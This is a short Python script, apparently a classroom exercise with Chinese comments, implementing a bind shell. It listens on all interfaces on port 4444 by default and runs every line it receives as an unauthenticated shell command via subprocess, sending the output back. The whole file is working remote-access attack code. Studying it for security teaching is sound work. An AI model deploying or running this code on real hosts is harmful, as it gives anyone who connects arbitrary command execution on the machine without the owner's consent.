#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Python bind shell（课堂练习二）

在目标主机上监听指定端口，等待连接。连接成功后，
客户端即可获得一个远程命令行，在目标主机上执行命令。
"""

import socket
import subprocess

import click


def run_cmd(cmd):
    """执行一条 shell 命令，返回其标准输出（bytes）。"""
    output = subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
    )
    return output.stdout


def handle_client(client_socket):
    """处理单个客户端的命令循环。"""
    while True:
        # 1. 接收客户端发来的字节，一直读到换行符为止。
        #    chr(10) 就是换行符 '\n'，其 ASCII 码是 10。
        #    TCP 是字节流，一条命令可能被拆成多个包，所以需要循环接收。
        data = b''
        while True:
            chunk = client_socket.recv(2048)
            if len(chunk) == 0:
                # 连接已关闭
                client_socket.close()
                return
            data += chunk
            if chunk[-1] == 10:
                break

        # 2. 把字节转换成字符串，去掉结尾的换行符。
        cmd = data.decode(errors='replace').strip()

        # 3. 如果是 exit，就关闭连接、结束循环。
        if cmd.lower() == 'exit':
            client_socket.close()
            return

        # 4. 否则在本地执行命令，把输出返回给客户端。
        client_socket.sendall(run_cmd(cmd))


@click.command()
@click.option('--port', '-p', default=4444, show_default=True,
              help='Port to listen on.')
def main(port):
    """启动 bind shell 服务端。"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f'[*] Listening on 0.0.0.0:{port}')

    while True:
        client_socket, address = server.accept()
        print(f'[*] Accepted connection from {address[0]}:{address[1]}')
        handle_client(client_socket)
        print('[*] Connection closed.')


if __name__ == '__main__':
    main()
